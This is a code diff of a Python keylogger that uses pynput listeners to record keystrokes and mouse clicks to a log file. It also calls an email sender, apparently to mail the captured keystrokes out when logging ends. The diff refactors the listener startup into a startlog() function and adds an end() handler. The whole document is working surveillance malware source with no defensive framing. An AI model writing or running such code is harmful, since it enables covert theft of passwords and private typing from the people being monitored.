@@ -71,12 +71,27 @@ def on_release(key):
         emailsender.sendmail()
         mouseflag=0
         return False
+    
 
-#wipe the text file and start listening
-with Listener(on_press=on_press, on_release =on_release) as listener:
-    with mouse.Listener(on_click=on_click) as listener2:
-        with open("log.txt", "w") as wipe:
-            wipe.close()
-        #two listeners one for keyboard one for mouse
-        listener.join()
-        listener2.join()
+#for the button that ends the logger
+def end():
+    #write the keys to the file
+    write_file(keys)
+    #send the email
+    emailsender.sendmail()
+    #set mouseflag to false
+    mouseflag=0
+    #end
+    return False
+
+
+    
+def startlog():
+    #wipe the text file and start listening
+    with Listener(on_press=on_press, on_release =on_release) as listener:
+        with mouse.Listener(on_click=on_click) as listener2:
+            with open("log.txt", "w") as wipe:
+                wipe.close()
+            #two listeners one for keyboard one for mouse
+            listener.join()
+            listener2.join()
